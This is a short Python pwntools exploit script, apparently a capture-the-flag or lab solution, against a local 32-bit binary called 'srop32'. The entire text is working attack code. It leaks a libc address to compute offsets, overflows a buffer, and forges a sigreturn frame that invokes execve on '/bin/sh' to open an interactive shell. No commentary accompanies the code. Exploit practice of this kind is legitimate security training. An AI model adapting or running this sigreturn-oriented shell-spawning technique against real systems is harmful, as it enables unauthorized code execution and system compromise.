from pwn import *

libc = ELF("/lib/i386-linux-gnu/libc-2.23.so")

p = process('./srop32')
gdb.attach(p)

printf_offset = libc.symbols['printf']
syscall_offset = libc.symbols['syscall']
ksigreturn_offset = 0x1cab30
binsh_offset = 0x15ba0b

p.recvuntil(': ')
libc_base = p.recvuntil('\n')
libc_base = int(libc_base, 16)

libc_base -= printf_offset
syscall = libc_base + syscall_offset
ksigreturn = libc_base + ksigreturn_offset
binsh = libc_base + binsh_offset

payload = "A"*66
payload += p32(ksigreturn)
payload += p32(0x0)

frame = SigreturnFrame(kernel='i386')
frame.eax = 0xb
frame.ebx = binsh
frame.esp = syscall
frame.eip = syscall

payload += str(frame)

p.send(payload)
p.interactive()
